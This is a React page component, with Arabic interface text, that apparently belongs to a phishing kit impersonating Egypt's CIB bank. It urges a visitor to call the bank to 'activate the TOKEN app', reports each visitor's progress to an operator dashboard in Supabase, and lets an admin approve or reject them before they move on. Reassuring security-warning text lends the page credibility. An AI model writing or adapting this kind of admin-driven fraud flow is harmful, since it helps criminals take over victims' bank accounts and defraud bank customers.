import { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { Phone, ShieldCheck, Clock, AlertTriangle, Info, CheckCircle2, XCircle, Loader2 } from "lucide-react";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";

const BankCall = () => {
  const [searchParams] = useSearchParams();
  const userId = searchParams.get("uid") || "";
  const rejected = searchParams.get("rejected") === "true";
  const tParam = searchParams.get("t") || "";

  // عند الموافقة من الادمن → ينتقل الى صفحة الانتظار
  useAdminRedirect(userId || null, { approveRedirect: "/waiting" });

  // مراحل: idle (عداد 15ث) | ready (الزر ظاهر) | pending (في انتظار قرار الادمن)
  const [stage, setStage] = useState<"idle" | "ready" | "pending">("idle");
  const [countdown, setCountdown] = useState(15);
  const [submitting, setSubmitting] = useState(false);

  // تسجيل الصفحة الحالية في DB + إعادة تشغيل العداد عند الدخول او عند الرفض
  useEffect(() => {
    if (!userId) return;
    setStage("idle");
    setCountdown(15);
    supabase
      .from("dashboard_users")
      .update({ last_page: "مكالمة البنك" })
      .eq("id", userId)
      .then(() => {});
  }, [userId, tParam]);

  // عداد 15 ثانية
  useEffect(() => {
    if (stage !== "idle") return;
    if (countdown <= 0) {
      setStage("ready");
      return;
    }
    const timer = setTimeout(() => setCountdown((c) => c - 1), 1000);
    return () => clearTimeout(timer);
  }, [stage, countdown]);

  const handleCalled = async () => {
    if (!userId) {
      setStage("pending");
      return;
    }
    setSubmitting(true);
    // اشعار الادمن: الزائر اتم المكالمة وينتظر القرار
    await supabase
      .from("dashboard_users")
      .update({
        last_page: "مكالمة البنك",
        status_tabs: {
          action: "انتظار",
          source: "bank_call_done",
          timestamp: new Date().toISOString(),
        },
      })
      .eq("id", userId);
    setSubmitting(false);
    setStage("pending");
  };

  return (
    <div className="min-h-screen flex flex-col bg-background" dir="rtl">
      <SiteHeader />

      <main className="flex-1 container mx-auto px-4 py-10">
        <div className="max-w-2xl mx-auto">
          {/* Hero */}
          <div className="text-center mb-8 animate-fade-in">
            <div className="inline-flex w-20 h-20 rounded-full hero-gradient items-center justify-center shadow-[0_10px_40px_hsl(213_76%_44%/0.45)] mb-4">
              <Phone className="w-10 h-10 text-primary-foreground animate-pulse" />
            </div>
            <h1 className="text-3xl font-extrabold text-foreground mb-2">مكالمة من البنك</h1>
            <p className="text-sm text-muted-foreground">
              يرجى الاتصال بخدمة العملاء لإتمام تفعيل طلبك
            </p>
          </div>

          {/* تنبيه الرفض */}
          {rejected && stage !== "pending" && (
            <div className="mb-5 bg-destructive/10 border-2 border-destructive/40 rounded-xl p-4 flex items-start gap-3 animate-fade-in">
              <XCircle className="w-6 h-6 text-destructive shrink-0 mt-0.5" />
              <div>
                <h3 className="font-bold text-destructive mb-1 text-sm">لم يتم تفعيل التوكين</h3>
                <p className="text-xs text-foreground leading-relaxed">
                  لم تقم بتفعيل التوكين عبر الاتصال بخدمة العملاء. يرجى الاتصال على الرقم أدناه وإتمام التفعيل ثم الضغط على زر التأكيد.
                </p>
              </div>
            </div>
          )}

          {/* Info Box */}
          <div className="bg-card border border-border rounded-2xl shadow-lg overflow-hidden">
            <div className="hero-gradient px-5 py-4 flex items-center gap-3">
              <Info className="w-5 h-5 text-primary-foreground" />
              <h2 className="text-base font-bold text-primary-foreground">خطوة أخيرة لإتمام الطلب</h2>
            </div>

            <div className="p-6 space-y-5">
              <div className="bg-gradient-to-br from-primary/5 to-primary/10 border border-primary/20 rounded-xl p-5 text-center">
                <p className="text-base font-bold text-foreground leading-relaxed mb-4">
                  لإتمام تفعيل طلبك يرجى الاتصال بخدمة العملاء
                </p>
                <a
                  href="tel:19666"
                  className="inline-flex items-center gap-3 px-6 py-3 rounded-xl hero-gradient text-primary-foreground font-extrabold text-2xl shadow-[0_8px_30px_hsl(213_76%_44%/0.4)] hover:scale-105 transition-transform tracking-wider"
                  dir="ltr"
                >
                  <Phone className="w-6 h-6" />
                  19666
                </a>
                <p className="text-sm font-bold text-foreground mt-4">
                  لتفعيل تطبيق <span className="text-primary">TOKEN</span>
                </p>
              </div>

              <div className="flex items-start gap-3">
                <ShieldCheck className="w-5 h-5 text-primary shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-bold text-foreground mb-1 text-sm">اتصال آمن وموثوق</h3>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    رقم 19666 هو الرقم الرسمي لخدمة عملاء البنك التجاري الدولي CIB، متاح على مدار 24 ساعة.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <Clock className="w-5 h-5 text-primary shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-bold text-foreground mb-1 text-sm">إجراء سريع</h3>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    سيقوم موظف خدمة العملاء بإرشادك خطوة بخطوة لتفعيل تطبيق TOKEN واستكمال طلبك خلال دقائق.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <AlertTriangle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-bold text-foreground mb-1 text-sm">تنبيه أمني</h3>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    لا تشارك كلمة المرور أو رمز التحقق (OTP) كاملاً مع أي شخص. موظف البنك لن يطلب منك ذلك أبداً.
                  </p>
                </div>
              </div>

              {/* منطقة الزر / حالة الانتظار */}
              <div className="pt-2 border-t border-border">
                {stage === "idle" && (
                  <div className="text-center bg-muted/40 rounded-xl p-4">
                    <Clock className="w-5 h-5 text-muted-foreground mx-auto mb-2" />
                    <p className="text-xs text-muted-foreground">
                      سيظهر زر التأكيد خلال{" "}
                      <span className="font-bold text-foreground">{countdown}</span> ثانية
                    </p>
                  </div>
                )}

                {stage === "ready" && (
                  <Button
                    onClick={handleCalled}
                    disabled={submitting}
                    className="w-full h-12 text-base font-bold hero-gradient text-primary-foreground shadow-[0_8px_30px_hsl(213_76%_44%/0.4)] hover:scale-[1.02] transition-transform animate-fade-in"
                  >
                    {submitting ? (
                      <Loader2 className="w-5 h-5 animate-spin" />
                    ) : (
                      <>
                        <CheckCircle2 className="w-5 h-5 ml-2" />
                        لقد قمت بالمكالمة
                      </>
                    )}
                  </Button>
                )}

                {stage === "pending" && (
                  <div className="text-center bg-primary/5 border border-primary/20 rounded-xl p-5 animate-fade-in">
                    <div className="flex items-center justify-center gap-2 mb-2">
                      <span className="relative flex h-3 w-3">
                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75" />
                        <span className="relative inline-flex rounded-full h-3 w-3 bg-primary" />
                      </span>
                      <span className="text-sm font-bold text-foreground">
                        جاري التحقق من إتمام التفعيل...
                      </span>
                    </div>
                    <p className="text-xs text-muted-foreground">
                      يرجى الانتظار، سيتم مراجعة طلبك خلال لحظات
                    </p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </main>

      <SiteFooter />
    </div>
  );
};

export default BankCall;
